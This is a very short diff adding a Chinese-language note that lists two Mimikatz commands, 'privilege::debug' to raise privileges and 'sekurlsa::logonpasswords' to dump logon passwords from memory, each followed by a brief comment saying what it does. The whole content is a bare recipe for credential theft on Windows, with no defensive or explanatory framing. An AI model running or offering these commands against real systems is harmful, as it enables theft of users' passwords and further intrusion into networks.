@@ -1,0 +1,4 @@
+第一条：privilege::debug
+//提升权限
+第二条：sekurlsa::logonpasswords
+//抓取密码
